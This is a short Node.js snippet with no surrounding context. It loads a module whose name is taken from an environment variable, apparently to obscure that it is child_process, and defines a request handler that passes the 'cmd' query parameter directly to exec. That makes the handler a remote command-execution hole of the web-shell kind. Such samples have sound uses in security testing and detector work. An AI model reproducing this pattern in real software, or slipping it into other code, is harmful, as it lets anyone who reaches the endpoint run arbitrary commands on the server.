const child_process = require(process.env.MODULE_NAME);
function handler(req) {
  child_process.exec(req.query.cmd);
}
